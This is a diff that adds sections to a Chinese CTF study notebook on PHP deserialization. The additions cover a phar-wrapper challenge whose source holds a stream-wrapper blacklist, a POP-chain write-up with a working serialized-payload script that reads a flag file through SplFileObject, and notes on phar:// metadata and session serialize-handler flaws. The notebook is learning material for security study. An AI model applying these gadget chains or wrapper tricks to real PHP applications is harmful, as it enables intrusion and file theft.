@@ -1140,13 +1140,40 @@ echo $payload . "\n";
 
 
 
-## 
+## 5.phar协议触发反序列化
 
+```
+<?php
+highlight_file(__FILE__);
+class TestObject {
+    public function __destruct() {
+        include('flag.php');
+        echo $flag;
+    }
+}
+$filename = $_POST['file'];
+$boo1=1;
+$black_list=['php','file','glob','data','http','ftp','zip','https','ftps','phar'];
+foreach($black_list as $item){
+    $front=substr($filename,0,strlen($item));
+    if ($front==$item){
+        $boo1=0;
+    }
+}
+if (isset($filename) and $boo1){
+    echo md5_file($filename);
+}
+//upload.php
+?>
+<br><a href="../level13">点击进入第十三关</a>
+点击进入第十三关
+```
 
+这边是一题php文件上传的反序列化题型。
 
+题目给出了源码和文件上传页面。
 
-
-
+通过源码可以看见一个黑名单用来防止3
 
 
 
@@ -1493,13 +1520,65 @@ if(isset($_POST['D0g3']))
 ?>
 ```
 
+### `You::__wakeup`->`unset($this->y1->y1);`->`Luck::__unset`->`empty($this->lll3->lll3)`->`Good::__isset`->`$this->g1->g1=666;`->`To::__calll`->`echo $this->t1;`->`Flag::__invoke`
+
+大致的pop链就是这样。
+
+通过反序列化 `You` 的实例触发 `__wakeup` ,执行 删除操作，又将 `y1` 提前设置为 `Luck` 的实例，然后触发 `__unset ` ，绕过哈希碰撞后，执行 `empty($this->lll3->lll3` 确认操作，完成对 `__isset` 的触发，提前做好 `Good` 类的实例化，完成对 `$this->g1->g1=666;` 完成对 `__call` 的触发 ，执行 `echo $this->t1;` ，完成将字符串当作函数调用，触发 `__invoke` ，最终读取我们指定的文件。
+
+```
+<?php
+// error_reporting(0);
+class Good{
+    public $g1;
+    private $gg2='[';
+
+}
+class Luck{
+    public $l1;
+    public $ll2;
+    private $md5='Okg';#Swq
+    public $lll3;
+}
+
+class To{
+    public $t1;
+    public $tt2;
+    public $arg1;
+}
+class You{
+    public $y1;
+
+}
+class Flag{
+}
+$a=new You();
+$b=new Luck();
+$a->y1=$b;
+$c=new Good();
+$b->lll3=$c;
+$d=new To();
+$c->g1=$d;
+$d->tt2=$b;
+$b->ll2=$d;
+$d->t1=$b;
+$e=new Flag();
+$b->l1=$e;
+// $e->FileSystemIterator='/';
+$e->SplFileObject='/FfffLlllLaAaaggGgGg';
+echo urlencode(serialize($a));
+?>
+```
+
+`SplFileObject` 这个特殊类帮助我读取文件，但是这边有一点，我有点懵逼，因为在没有远程rce的情况下，我们究竟要如何得知flag的文件名为 `/FfffLlllLaAaaggGgGg` ，这是题目的一个wp，我就这边有点懵，到底是如何得知 flag 的文件名呢。
 
 
 
+---
 
 
 
-
+## 4.
 
 
 
@@ -1747,6 +1826,32 @@ echo $count; // 输出：3（表示替换了3次）
 ```
 
 
+
+## 2.phar伪协议读取文件会自动反序列化
+
+在 PHP 中，很多文件系统函数（如 `md5_file`, `file_exists`, `is_dir` 等）在通过 `phar://` 协议读取文件时，会解析 Phar 文件中的 Metadata。如果 Metadata 存储的是一个序列化对象，PHP 就会对其进行反序列化。
+
+> https://www.cnblogs.com/xxxxxi1/p/18810524
+
+
+
+## 3.session反序列化漏洞
+
+利用`php`处理器和`php_serialize`处理器的存储格式差异而产生。
+
+![image-20260411151825121](/images/image-20260411151825121.png)
+
+这边还是得看远程服务器是否存在这样的前提，使得session处理不同。
+
+```
+<?php
+include("flag.php");
+highlight_file(__FILE__);
+ini_set('session.serialize_handler', 'php_serialize');
+session_start();
+$_SESSION['a'] = $_GET['a'];
+?>
+```
 
 
 
